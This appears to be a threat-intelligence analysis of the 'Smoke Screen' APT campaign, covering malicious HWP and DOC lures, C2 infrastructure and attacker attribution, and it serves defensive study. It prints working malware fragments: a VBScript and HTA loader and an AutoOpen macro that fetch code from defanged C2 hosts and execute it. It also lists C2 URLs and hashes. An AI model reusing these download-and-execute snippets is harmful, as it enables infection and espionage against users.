The VBScript code\n\n\ncontained within the HTML application host is then executed.\n\n\nSet Post0 = CreateObject(\"MSXML2.ServerXMLHTTP.6.0\"):\n\n\nPost0.open \"GET\", \"http://naban.co[.]kr/mobile/skin/member/ctml/v/expres.php?op=1\", False:\n\n\n-----\n\nPost0.Send:\n\n\nt0=Post0.responseText:\n\n\nExecute(t0)\n\n\nThe malicious script code goes through stages 1-3 of the following steps, runs a PowerShell\n\nbased keylogger, and secretly collects information from the infected computer, then registers\n\n\nitself in the system registry to conduct espionage operations by communicating with its C2\n\n\nserver.\n\n\n-----\n\nWhen the malicious HWP document is executed, the title Government official s remarks about\n\n\nKorea-US Summit.hwp(20190409)’ and the content will be displayed. The document is\n\n\nregistered with the account 'Tom', which is the same as that of 'Stealth Power' operation.\n\n\n\n[Figure 1-1] Screen shown after running malicious HWP and the 'Tom' account\n\n\nA malicious .doc' file named 'TaskForceReport.doc', which was created at 05:15 pm (KST) on April 01, 2019,\n\n\nhas been discovered abroad.\n\n\nESRC has observed that the malicious DOC file was related to the recent infringement incidents occurred in\n\n\nSouth Korea and the United States, meaning that the threat organization is actively involved in targeted\n\n\nattacks at home and abroad.\n\n\nInterestingly, the series of malware used in the APT attack is directly or indirectly related to ‘Kimsuky\n\n\n[organization, Operation Stealth Power Silent Operation’ (2019-04-30) and 'Huge threat coming up,](https://blog.alyac.co.kr/2234)\n\n\n“Operation Giant Baby”' (2019-03-28), which is one of ‘Baby’ Campaign series.\n\n\n-----\n\nThe malicious HWP document files, which have been found in Korea from the end of March to\n\n\nthe beginning of April, exploited the same vulnerability and the same account name 'Tom'.\n\n\n\n[Figure 1-2] Metadata of HWP malicious document file\n\n\n\n**■ Background of the APT Campaign ‘Smoke Screen’, the master of camouflage and smokescreen**\n\n\n**tactics**\n\n\nThe malicious file 'TaskForceReport.doc' was first reported abroad, but the document was written in Korean,\n\n\nand numerous similar variants have been found.\n\n\nThe author of the malicious file used the unusual Windows accounts such as 'windowsmb', 'JamFedura', 'Aji',\n\n\n'DefaultAcount', 'yer' and 'Roberts Brad' etc., has traded cryptocurrencies such as Bitcoin (BTC), and\n\n\nparticipated in the development of gambling games and cryptocurrency-related programs.\n\n\n-----\n\nSome accounts are registered on the Korean messenger Kakao Talk, and they are using the messenger\n\n\nservices such as Telegram and Skype as well.\n\n\nESRC believes that there are 'state-sponsored actors' behind the APT attack based on the analyzed data, and\n\n\nnamed the APT attack 'Campaign Smoke Screen', concerning that the attackers are fluent in Korean and\n\n\nEnglish and act secretly by abusing the stolen profiles that are using photos of foreigners.\n\n\n\n**■ Analysis of tactics and threat vector of DOC-based APT attack**\n\n\nThe malicious document file 'TaskForceReport.doc' (MD5: d400adcd06e0a07549e2465c9c500c45) created on\n\n\nApril 01, 2019 was distributed via the following address.\n\n\n\n- tdalpacafarm[.]com/wp-includes/Text/Diff/common/doc.php\n\n\nHowever, the above server has already been used by the malicious document 'Oct_Bld_full_view.docm '(MD5:\n\n\n1a6f9190e7c53cd4e9ca4532547131af) as C2 server, and reported as ['New BabyShark Malware Targets U.S.](https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/)\n\n\nNational Security Think Tanks' by Unit 42 team of Palo Alto Networks.\n\n\nThe VBA code used at the time is as follows.\n\n\nSub change_words(ByVal findWord, ByVal replaceWord)\n\n\nWith Selection.Find\n\n\n.Text = findWord\n\n\n.Replacement.Text = replaceWord\n\n\n-----\n\n.Forward True\n\n\n.Wrap = wdFindContinue\n\n\n.MatchWholeWord = True\n\n\nEnd With\n\n\nSelection.Find.Execute Replace:=wdReplaceAll\n\n\nEnd Sub\n\n\nSub AutoOpen()\n\n\nShell (\"mshta https://tdalpacafarm[.]com/files/kr/contents/Vkggy0.hta\")\n\n\nEnd Sub\n\n\nIf the 'Vkggy0.hta' in the code above is loaded normally, it will receive an HTTP GET response by executing\n\n\nthe internal VBScript command and the additional PowerShell commands would be subsequently executed.\n\n\nThe recently found malicious document files also have the same sequence flow.\n\n\nWhen a malicious document file is executed, a security alert messages, telling that the software update is\n\n\nrequired to display the content, pops up to trick users into clicking the Enable Content button.\n\n\n-----\n\n[Figure 2] Screen displayed after executing the malicious document written in Korean\n\n\nThe malicious document contains files range from 'activeX1.bin' to 'activeX10.bin'. The file 'activeX2.bin' is the\n\none that has the communication host addresses as follows, and it tries the additional C2 communication by\n\n\nmeans of HTA commands and conditions.\n\n\n\n- https://tdalpacafarm[.]com//wp-includes/Text/Diff/common/Htqgf0.hta\n\n\n\n- https://tdalpacafarm[.]com//wp-includes/Text/Diff/common/expres.php?op=1\n\n\n\n- https://tdalpacafarm[.]com//wp-includes/Text/Diff/common/cow.php?op=exe.gif\n\n\n\n- https://tdalpacafarm[.]com//wp-includes/Text/Diff/common/cow.php?op=cow.gif\n\n\n-----\n\n[Figure 3] Code of 'activeX2.bin' file\n\n\nAnother variant with the same name as the 'TaskForceReport.doc' (MD5:\n\n\n0f77143ce98d0b9f69c802789e3b1713) file has been propagated in March.\n\n\n\n- https://christinadudley[.]com/public_html/includes/common/Qfnaq0.hta\n\n\n\n- https://christinadudley[.]com/public_html/includes/common/expres.php?op=1\n\n\n\n- https://christinadudley[.]com/public_html/includes/common/cow.php?op=Normal.src\n\n\n\n- https://christinadudley[.]com/public_html/includes/common/Normal.src\n\n\n\n- https://christinadudley[.]com/public_html/includes/common/cow.php?op=exe.gif\n\n\n\n- https://christinadudley[.]com/public_html/includes/common/cow.php?op=cow.gif\n\n\nThe C2 domain christinadudley[.]com was used for distribution.\n\n\nThe file 'Qfnaq0.hta' contains the following script code, which loads the code 'expres.php?op=1' with the\n\n\ndecoding key and the routine.\n\n\n-----\n\n<html><script language VBScript >On Error Resume Next:Function Co00(c):L Len(c):s :For jx 0 To d\n\n\n1:For ix=0 To Int(L/d)-1:s=s&Mid(c,ix*d+jx+1,1):Next:Next:s=s&Right(c,L-Int(L/d)*d):Co00=s:End Function:Set\n\n\nPost0 = CreateObject(\"MSXML2.ServerXMLHTTP.6.0\"):Post0.open \"GET\",\n\n\n\"https://christinadudley[.]com/public_html/includes/common/expres.php?op=1\",\n\n\nFalse:Post0.Send:t0=Post0.responseText:d=7:t0=Co00(t0):Execute(t0):window.close()</script></html>\n\n\nThe finally delivered file 'exe.gif' is encoded in BASE64 code, and converted to 32-bit EXE format malware\n\n\nafter the process of decoding.\n\n\n\n[Figure 4] The file encoded in BASE64\n\n\nThe decoded EXE file contains a digital signature of EGIS Co, Ltd, that has been exploited in past infringement\n\n\nincidents in Korea.\n\n\n-----\n\n[Figure 5] Digital signature of EGIS Co., Ltd.\n\n\nHTA script used in the DOC attack vector indicates that the similar script format has been used in both the\n\n\nrecently discovered APT attack 'Campaign Smoke Screen' and the HWP document-based attack 'Operation\n\n\nStealth Power', which occurred on March 31 and April 1 in Korea.\n\n\nThe PowerShell-based function ‘Start-KeyLogger’ installed by the HWP malicious document was also used\n\n\nthe same as it is used in the DOC malicious document series.\n\n\nThe threat organization exploited the HWP document vulnerability for conducting the APT attack against\n\n\nKorea while they used malicious DOC documents for carrying out the attacks targeting to foreign countries.\n\n\n-----\n\n[Figure 6] Comparison of malicious scripts found home and abroad\n\n\nIn particular, the above figure shows that the function styles used by PowerShell as well as the file names\n\n\n('expres.php?op=1', 'cow.php?op=1\") and parameters used to communicate with the C2 server are very\n\n\nsimilar in both scripts.\n\n\n-----\n\nIn addition, the file name upload.php is used in common for information leakage.

Screen”](https://blog.talosintelligence.com/2018/05/navrat.html)\n\n\ncampaign.\n\n\n-----\n\nTalos team has previously suspected that there was possibility of the correlation between NavRAT family and\n\n\n'Group123' (aka Geumseong121, RedEyes), and ESRC confirmed that the series is exactly the same as the\n\n\nHWP vulnerability shellcode used for the attack on Korea Hydro & Nuclear Power in 2014.\n\n\nESRC is conducting a thorough investigation on “Smoke Screen” campaign, regarding that specific IP bands\n\n\nand typical disturbance tactics used for the campaign show similar patterns to the multiple strategies and\n\n\ntechniques deployed in recent cyber operations.\n\n\nAccording to the self-analysis data and classification criteria, it is most likely that the KHNP-related hacking\n\n\ngroup is behind the “Smoke Screen” APT campaign, rather than Geumseong121.\n\n\nHowever, since the same IOC has been identified in the attacks carried out by the two organizations in\n\n\nseveral cases, there was a possibility of mutual cooperation, reorganization, and shift of the personnel system.\n\n\nESRC found that the malicious file variant named 'NavRAT' attempted to communicate with an email account\n\n\n'jamshine1993@hotmail.com' in the process of investigating the threat actors behind the “Smoke Screen”\n\n\nAPT campaign.\n\n\nThe ID 'tiger199392' disguised as a Google update program was used for the communication and sent\n\n\ninformation of the infected users to the email address 'Jamshine1993@hotmail.com'.\n\n\n-----\n\n[Figure 13] NavRAT communicating with 'JamShine1993@hotmail.com'\n\n\nThe \"NavRAT\" type of malicious file contains some similar accounts (hni) to the HWP vulnerability code (MD5:\n\n\nc94e5da189bf166fc4a2670685a796a3) of the so-called \"Kimsuky\" series reported in 2016.\n\n\n-----\n\n[Figure 14] Comparison of NavRAT (upper) series and Kimsuky series HWP (lower) code\n\n\nA similar account is also found on Telegram, where the representative profile image is\n\n\ndisplayed by stealing the image of \"Reece Thompson,\" starring actor of 2007 movie ‘Rocket\n\n\nScience’.\n\n\n-----\n\n[Figure 15] Stealing the image of the starring actor of 2007 movie ‘Rocket Science’ for\n\n\nTelegram profile\n\n\nIt is not clear whether the movie was stolen on purpose or randomly selected by the attacker,\n\n\nand it is known that a Korean judge appears in the movie.\n\n\nTwitter's profile image was also created by an unauthorized use of one of the images posted\n\n\non a hair model site.\n\n\n-----\n\n[Figure 16] Model images on “hothairstyle” site\n\n\nESRC found that the account 'jamfedura0293' on Telegram was registered on January 4, 2019\n\n\n[in the Korean version of Philippine bitcoin trading site 'Bit Manila'.

Interestingly, 'tiger1993' account, which was used by the malware,\n\n\nhas been registered on KakaoTalk with the name 'coinchange'.\n\n\nFurthermore, the profile image of the account exactly matched the image of the Telegram\n\n\naccount '@jamfedura0293'.\n\n\n-----\n\n[Figure 19] 'tiger1993' registered in KakaoTalk\n\n\nIt is practically impossible for a two different person to accidentally use the same profile image\n\n\non KakaoTalk and Telegram at the same time.\n\n\nThe same profile image was also found on 'freelancer' site, which connects the program\n\n\ndevelopers and the

the hackers were involved in the development of cryptocurrency trading sites,\n\n\ncrypto-mining programs, online gambling sites and worked as a development agency of\n\n\nmalicious programs.\n\n\nThe
